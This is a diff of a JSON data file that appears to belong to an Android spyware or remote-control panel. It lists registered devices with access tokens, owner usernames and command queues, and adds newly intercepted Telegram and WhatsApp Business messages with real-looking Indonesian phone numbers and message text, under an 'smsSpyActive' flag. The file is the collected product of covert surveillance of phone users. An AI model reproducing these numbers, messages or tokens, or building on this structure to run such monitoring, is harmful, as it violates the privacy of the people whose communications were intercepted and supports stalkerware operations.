@@ -4,7 +4,7 @@
     "deviceName": "HP-ABLO-F55F",
     "ownerUsername": "Zarr",
     "token": "7055f57f74cb7eef5034e3301d747b14",
-    "lastSeen": 1777780735904,
+    "lastSeen": 1777780741574,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T05:33:28.300Z",
@@ -2549,6 +2549,46 @@
     "smsSpyActive": true,
     "smsMessages": [
       {
+        "appName": "Telegram",
+        "sender": "Damxzk stecu",
+        "content": "Zal",
+        "time": "03/05 10:59",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777780742103
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎6 pesan dari 4 chat",
+        "time": "03/05 10:58",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1777780737071
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 889-9189-1934",
+        "content": "Oke makasih min",
+        "time": "03/05 10:58",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1777780737031
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 851-8812-7739",
+        "content": "yang VIP",
+        "time": "03/05 10:58",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1777780736998
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 821-3037-8158",
+        "content": "assalamu'alaikum bang",
+        "time": "03/05 10:58",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1777780736846
+      },
+      {
         "appName": "WA Business",
         "sender": "+62 896-7370-4325",
         "content": "Web bug masih ada ga",
@@ -3069,7 +3109,7 @@
     "deviceName": "HP-ABIR123-0330",
     "ownerUsername": "Fibersec",
     "token": "ab095dd2405dc78cf8aaa200b596d4bd",
-    "lastSeen": 1777780735821,
+    "lastSeen": 1777780741840,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T20:52:30.047Z",
